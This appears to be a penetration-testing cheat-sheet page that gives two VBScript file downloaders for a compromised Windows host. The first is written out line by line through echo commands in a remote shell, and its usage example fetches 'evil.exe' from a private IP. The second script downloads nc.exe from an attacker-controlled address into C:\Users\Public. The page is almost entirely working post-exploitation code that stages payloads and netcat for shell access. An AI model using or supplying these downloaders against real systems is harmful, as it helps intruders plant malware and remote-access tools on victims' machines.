<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>VBscript</title>
</head><body><b>VBscript downloader 1<br/>
</b><br/>
In remote shell run<br/>
<tt><br/>
echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs<br/>
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs<br/>
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs<br/>
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs<br/>
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs<br/>
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs<br/>
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs<br/>
echo Err.Clear &gt;&gt; wget.vbs<br/>
echo Set http = Nothing &gt;&gt; wget.vbs<br/>
echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs<br/>
echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs<br/>
echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs<br/>
echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs<br/>
echo http.Open &quot;GET&quot;, strURL, False &gt;&gt; wget.vbs<br/>
echo http.Send &gt;&gt; wget.vbs<br/>
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs<br/>
echo Set http = Nothing &gt;&gt; wget.vbs<br/>
echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs<br/>
echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs<br/>
echo strData = &quot;&quot; &gt;&gt; wget.vbs<br/>
echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs<br/>
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs<br/>
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs<br/>
echo Next &gt;&gt; wget.vbs<br/>
echo ts.Close &gt;&gt; wget.vbs<br/>
<br/>
</tt><b>Using VBscript downloader 1</b><br/>
<br/>
<tt>cscript wget.vbs &lt;url&gt; &lt;output_file_name&gt;<br/>
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe<br/>
<br/>
</tt><b>VBscript downloader 2</b><tt><br/>
</tt><tt><br/>
C:\Users\Public&gt;type script.vbs<br/>
type script.vbs<br/>
<br/>
dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)<br/>
dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)<br/>
xHttp.Open &quot;GET&quot;, &quot;<b>http://10.11.0.134/nc.exe</b>&quot;, False<br/>
xHttp.Send<br/>
<br/>
with bStrm<br/>
  .type = 1 '//binary<br/>
  .open<br/>
  .write xHttp.responseBody<br/>
  .savetofile &quot;<b>C:\Users\Public\nc.exe</b>&quot;, 2 '//overwrite<br/>
end with<br/>
</tt></body></html>